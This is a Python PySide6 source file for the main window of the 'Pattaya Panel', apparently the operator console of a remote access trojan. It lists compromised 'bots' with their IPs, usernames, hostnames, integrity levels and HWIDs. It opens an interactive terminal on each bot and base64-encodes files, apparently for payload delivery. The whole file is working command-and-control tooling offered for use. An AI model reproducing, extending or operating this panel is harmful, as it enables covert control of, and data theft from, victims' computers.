from PySide6.QtCore import Qt,QTimer,QSettings
from PySide6.QtWidgets import QApplication, QDialog, QMainWindow,QMessageBox,QTableView,QMenu,QLabel,QWidget,QFileDialog
from PySide6.QtGui import QIcon,QAction, QClipboard
from core.info import PATTAYA_PANEL_VERSION
from core.terminal_event import TerminalEvent
from core.util import PattayaPanelUtil
from designer.ui_main_window import Ui_MainWindow
from model.bot_table_model import BotTableModel
import qdarktheme
import psutil
from widget.about_pattaya import AboutPattayaWidget
from widget.server_setting import PattayaServerSetting
from widget.terminal import BotTerminalWidget


class MainWindow(QMainWindow, Ui_MainWindow):

    def __init__(self, app, socket_io_client):
        super().__init__()
        self.setupUi(self)
        self.app = app
        self.panel_username = "unknown"
        self.panel_allow_command = "unknown"
        self.backup_title = self.windowTitle()
        self.old_title = self.windowTitle()
        self.online_bot_count = 0
        self.update_title = self.old_title.replace('$VERSION', PATTAYA_PANEL_VERSION).replace('$ONLINE_BOT', str(self.online_bot_count)).replace('$PANEL_USER', self.panel_username)
        self.setWindowTitle(self.update_title)
        self.setMaximumSize(16777215, 16777215)
        self.settings = QSettings("unknownclub.net", "Pattaya")
        self.clipboard = QApplication.clipboard()
        if(self.settings.value("themes") is None):
            self.settings.setValue("themes", 1)
        
        self.url = ""
        self.token = ""

        self.terminal_event = TerminalEvent()
        

        self.about_dialog = AboutPattayaWidget()
        self.about_dialog.setWindowModality(Qt.WindowModality.ApplicationModal)
        
        PattayaPanelUtil.setup(self.panel_log_text_browser, self.server_log_text_browser)
        self.socket_io_client = socket_io_client
        self.bot_table_view.setShowGrid(False)

        self.bots_table_model = BotTableModel(self.socket_io_client)
        self.bot_table_view.setSelectionBehavior(QTableView.SelectRows)
        self.bot_table_view.setSelectionMode(QTableView.SingleSelection)
        self.bot_table_view.setModel(self.bots_table_model)
        self.bot_table_view.setAlternatingRowColors(True)

        self.timer = QTimer(self) # create a timer to update the stats periodically
        self.timer.timeout.connect(self.updateStats)
        self.timer.start(1000) # update the stats every 1 second


        self.cpuLabel = QLabel(self)
        self.ramLabel = QLabel(self)

        spacer = QWidget()

        self.statusBar().addWidget(spacer,1)
        self.statusBar().addWidget(self.cpuLabel)
        self.statusBar().addWidget(self.ramLabel)
        self.statusBar().show()


        self.actionExit.triggered.connect(self.app_exit)
        self.actionDark.triggered.connect(self.enable_dark_theme)
        self.actionLight.triggered.connect(self.enable_light_theme)
        self.actionAbout_Pattaya_Project.triggered.connect(self.about_pattaya_project)
        self.actionAbout_Qt.triggered.connect(self.about_qt)

        self.actionFile_to_Base64_Encode.triggered.connect(self.encode_file_base64)

        self.actionStart.triggered.connect(self.start)
        self.actionStop.triggered.connect(self.stop)
        self.actionRefresh_Bot.triggered.connect(self.refresh_bot)

        self.actionStop.setDisabled(True)
        self.actionRefresh_Bot.setDisabled(True)

        self.socket_io_client.connected_to_server.connect(self.disable_start_action)
        self.socket_io_client.disconnected_to_server.connect(self.disable_stop_action)


        self.socket_io_client.panel_received_bot_count_data.connect(self.update_online_bot)
        self.socket_io_client.panel_received_username.connect(self.update_username)
        self.socket_io_client.panel_received_allow_command.connect(self.update_allow_command)

        # Create a context menu with an action to print the selected row data
        self.context_menu = QMenu(self.bot_table_view)

        self.action_copy_bot = QAction("Copy bot information", self.context_menu)
        self.action_copy_bot.setIcon(QIcon(":/assets/images/books-stack.png"))
        self.action_copy_bot.triggered.connect(self.copy_bot)
        self.context_menu.addAction(self.action_copy_bot)

        self.action_bot_terminal = QAction("Terminal", self.context_menu)
        self.action_bot_terminal.setIcon(QIcon(":/assets/images/terminal.png"))
        self.action_bot_terminal.triggered.connect(self.bot_terminal)
        self.context_menu.addAction(self.action_bot_terminal)

        self.actionBot_Terminal.triggered.connect(self.bot_terminal)


        # Connect the context menu to the table widget
        self.bot_table_view.setContextMenuPolicy(Qt.CustomContextMenu)
        self.bot_table_view.customContextMenuRequested.connect(lambda pos:  self.context_menu.exec(self.bot_table_view.mapToGlobal(pos)))


        # Alternatively, you can use setStyleSheet()
        self.panel_log_text_browser.setStyleSheet("background-color: #000000;")
        self.server_log_text_browser.setStyleSheet("background-color: #000000;")


        self.pattaya_server_setting = PattayaServerSetting()
        self.actionServer_setting.triggered.connect(self.pattaya_setting)
        self.pattaya_server_setting.setWindowIcon(QIcon(":/assets/images/rat.png"))

        
    def app_exit(self):
        self.app.exit()

    def enable_dark_theme(self):
        qdarktheme.setup_theme(custom_colors={"primary": "#FB00FF"})
        self.settings.setValue("themes", 0)
        PattayaPanelUtil.panel_log_info(f"Selected theme saved!")

    def enable_light_theme(self):
        qdarktheme.setup_theme(theme="light",custom_colors={"primary": "#FB00FF"})
        self.settings.setValue("themes", 1)
        PattayaPanelUtil.panel_log_info(f"Selected theme saved!")

    def about_pattaya_project(self):
        self.about_dialog.show()
        self.about_dialog.play_sound()

    def about_qt(self):
        QApplication.aboutQt()


    def update_online_bot(self, data):
        if data == 0:
            self.bot_table_view.setDisabled(True)
        else:
            self.bot_table_view.setDisabled(False)
        self.online_bot_count = data
        self.update_title = self.backup_title.replace('$VERSION', PATTAYA_PANEL_VERSION).replace('$ONLINE_BOT', str(self.online_bot_count)).replace('$PANEL_USER', self.panel_username)
        self.setWindowTitle(self.update_title)

    def update_username(self, data):
        self.panel_username = data
        self.update_title = self.backup_title.replace('$VERSION', PATTAYA_PANEL_VERSION).replace('$ONLINE_BOT', str(self.online_bot_count)).replace('$PANEL_USER', self.panel_username)
        self.setWindowTitle(self.update_title)


    def update_allow_command(self, command):
        self.panel_allow_command = command


    def copy_bot(self):
        item = self.pick_bot()
        if item is None:
            return
        self.clipboard.setText(f"""
Socket ID -> {item['socketId']}
WAN IP -> {item['wanIp']}
LAN IP -> {item['lanIp']}
OS -> {item['os']}
USERNAME -> {item['username']}
HOSTNAME -> {item['hostname']}
PROCESS NAME -> {item['processName']}
PROCESS ID -> {item['processId']}
ARCHITECTURE -> {item['architecture']}
INTEGRITY -> {item['integrity']}
COUNTRY -> {item['country']}
LAST SEEN -> {item['lastSeen']}
HWID -> {item['hwid']}
TYPE -> {item['type']}
VERSION -> {item['version']}
        """)

        PattayaPanelUtil.panel_log_info(f"Bot username: {item['username']} was copied")


    def bot_terminal(self):
        item = self.pick_bot()
        if item is None:
            return
        
        if PattayaPanelUtil.terminals.get(item['hwid']) is not None:
            return
        
        terminal = BotTerminalWidget(item, self.url, self.token, "/", self.terminal_event, self.panel_username, self.panel_allow_command)
        old_title = terminal.windowTitle()
        update_title = old_title.replace('$USERNAME', item['username']).replace('$LAN', item['lanIp']).replace('$WAN', item['wanIp']).replace('$INTEGR', item['integrity']).replace('$PN', f"{item['processName']}.exe")
        terminal.setWindowTitle(update_title)
        PattayaPanelUtil.terminals[item['hwid']] = terminal
        (PattayaPanelUtil.terminals[item['hwid']]).show()
        PattayaPanelUtil.panel_log_info(f"Interacting with Bot username: {item['username']}")

    def pick_bot(self):
        # Get the currently selected model item data
        selected_indexes = self.bot_table_view.selectionModel().selectedIndexes()
        if selected_indexes:
            selected_index = selected_indexes[0]
            data = selected_index.data()
            item = self.bots_table_model.internal_data[int(data)]
            return item
        else:
            return None


    def start(self):
        # get current values for settings
        self.url = self.settings.value("url")
        self.token = self.settings.value("token")

        if  self.url == None or  self.token == None:
            PattayaPanelUtil.panel_log_error(f'Pattaya socket.io server configuration not found in system')
            QMessageBox.warning(self, 
            "Pattaya Panel Alert",
            "Not found Pattaya server setting, Please check your server setting",
            QMessageBox.Ok)
        else:
            self.socket_io_client.start( self.url,  self.token, "/")
        


    def stop(self):
        self.terminal_event.close_terminal()
        self.socket_io_client.stop()
        self.bots_table_model.refresh([])
    

    def disable_start_action(self):
        self.actionStart.setDisabled(True)
        self.actionStop.setDisabled(False)
        self.actionRefresh_Bot.setDisabled(False)



    def disable_stop_action(self):
        self.actionStart.setDisabled(False)
        self.actionStop.setDisabled(True)
        self.actionRefresh_Bot.setDisabled(True)
        self.setWindowTitle(self.windowTitle().replace(self.panel_username, 'DISCONNECTED'))


    def updateStats(self):
        cpuPercent = psutil.cpu_percent()
        ramPercent = psutil.virtual_memory().percent
        self.cpuLabel.setText("CPU usage: {}%".format(cpuPercent))
        self.ramLabel.setText("RAM usage: {}%".format(ramPercent))


    def pattaya_setting(self):
        ret = self.pattaya_server_setting.exec()
        if(ret == QDialog.Accepted):
            PattayaPanelUtil.panel_log_info(f'Pattaya socket.io server configuration saved!')
            self.settings.setValue("url", self.pattaya_server_setting.url)
            self.settings.setValue("token", self.pattaya_server_setting.token)
            QMessageBox.information(self, 
            "Pattaya server setting",
            "Setting Saved!",
            QMessageBox.Ok)
            self.socket_io_client.panel_token = None
            self.restart_server()
        else:
            PattayaPanelUtil.panel_log_error(f'Ignore Pattaya server configuration')
        


    def refresh_bot(self):
        self.socket_io_client.socket_io.emit("panel_request_bot_data", {"token": self.token})


    def encode_file_base64(self):
        #getOpenFileName  
        file_name,_ = QFileDialog.getOpenFileName(self, "Open File",
                                                      ".",
                                                      "All files(*.*)")
        
        if file_name == "":
            return
        
        base64_exe = PattayaPanelUtil.base64_file_encode(file_name)
        self.clipboard.setText(base64_exe)
        PattayaPanelUtil.panel_log_info(f'f{file_name} has been encoded in base64 format: f{base64_exe}')
        QMessageBox.information(self, 
            "Base64Encoding tool",
            "File success encoded in base64 format, Check your clipboard",
            QMessageBox.Ok)
        
        

    def closeEvent(self, event):
        self.stop()
        event.accept()


    def restart_server(self):
        self.stop()
        self.start()
    

    def clear_all_terminal(self):
        pass